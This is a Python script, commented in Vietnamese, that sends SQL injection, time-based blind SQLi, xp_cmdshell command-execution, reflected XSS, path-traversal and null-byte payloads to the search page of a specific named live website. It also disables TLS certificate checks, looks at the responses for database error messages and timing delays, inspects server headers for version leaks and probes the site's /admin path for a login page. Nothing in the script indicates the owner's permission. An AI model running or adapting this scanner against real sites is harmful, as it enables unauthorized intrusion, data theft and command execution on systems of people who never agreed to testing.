
import urllib.request
import urllib.parse
import ssl
import time

# Bỏ qua TLS verify nếu cần
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

base_url = 'https://mamcungviet.com/tim-kiem?q='

# Lấy response bình thường làm baseline
try:
    req = urllib.request.Request(base_url + 'hoa', headers={'User-Agent': 'Mozilla/5.0'})
    resp = urllib.request.urlopen(req, context=ctx, timeout=10)
    normal = resp.read().decode('utf-8', errors='ignore')
    normal_len = len(normal)
    print(f'[BASELINE] Normal search response size: {normal_len} bytes')
except Exception as e:
    print(f'[BASELINE ERROR] {e}')
    normal_len = 0

print('=' * 70)

payloads = [
    ("' OR '1'='1", 'Classic SQLi (Quote)'),
    ("1 OR 1=1", 'Classic SQLi (Numeric)'),
    ("1' AND 1=1 --", 'Boolean True'),
    ("1' AND 1=2 --", 'Boolean False'),
    ("'; WAITFOR DELAY '0:0:5' --", 'Time-based MSSQL 5s'),
    ("1; EXEC xp_cmdshell('whoami')--", 'Command Injection MSSQL'),
    ("<script>alert(1)</script>", 'XSS Reflected'),
    ("../../../etc/passwd", 'Path Traversal'),
    ("%00", 'Null Byte'),
    ("1/**/OR/**/1=1", 'SQLi Comment Bypass'),
]

for payload, name in payloads:
    try:
        encoded = urllib.parse.quote(payload, safe='')
        url = base_url + encoded
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        start = time.time()
        resp = urllib.request.urlopen(req, context=ctx, timeout=12)
        elapsed = time.time() - start
        body = resp.read().decode('utf-8', errors='ignore')
        size = len(body)
        diff = size - normal_len
        body_lower = body.lower()
        
        # Kiểm tra các dấu hiệu
        reflected = payload.lower() in body_lower
        error_keywords = []
        for kw in ['sql', 'syntax error', 'exception', 'stack trace', 'server error', 
                   'ora-', 'mysql', 'oledb', 'odbc', 'unclosed', 'quotation', 
                   'microsoft ole', 'incorrect syntax', 'x-aspnet-version']:
            if kw in body_lower:
                error_keywords.append(kw)
        
        timing_anomaly = elapsed > 4.5  # Nếu > 4.5s khi WAITFOR 5s -> time-based SQLi
        
        flags = []
        if reflected: flags.append('REFLECTED')
        if error_keywords: flags.append(f'ERROR_KW:{error_keywords}')
        if timing_anomaly: flags.append(f'TIMING_ANOMALY:{elapsed:.1f}s')
        if abs(diff) > 500: flags.append(f'SIZE_DIFF:{diff:+d}')
        
        status = '[!!!SUSPICIOUS!!!]' if flags else '[OK]'
        print(f'{status} [{name}]')
        print(f'  Size: {size} (diff: {diff:+d}) | Time: {elapsed:.2f}s')
        if flags:
            print(f'  FLAGS: {", ".join(flags)}')
    except Exception as e:
        print(f'[ERROR] [{name}]: {e}')
    print()

# Check server headers
print('=' * 70)
print('[SERVER HEADER CHECK]')
try:
    req = urllib.request.Request('https://mamcungviet.com/', headers={'User-Agent': 'Mozilla/5.0'})
    resp = urllib.request.urlopen(req, context=ctx, timeout=10)
    sensitive_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-Powered-By-Plesk']
    for h in sensitive_headers:
        val = resp.headers.get(h)
        if val:
            print(f'  [INFO DISCLOSURE] {h}: {val}')
    print()
except Exception as e:
    print(f'Error: {e}')

# Check /admin redirect
print('[ADMIN PANEL CHECK]')
try:
    req = urllib.request.Request('https://mamcungviet.com/admin', headers={'User-Agent': 'Mozilla/5.0'})
    resp = urllib.request.urlopen(req, context=ctx, timeout=10)
    print(f'  /admin -> Status: {resp.status}, URL: {resp.url}')
    body = resp.read().decode('utf-8', errors='ignore')
    print(f'  Response size: {len(body)} bytes')
    if 'login' in body.lower() or 'password' in body.lower():
        print('  [FOUND] Admin login page detected!')
except Exception as e:
    print(f'  /admin: {e}')
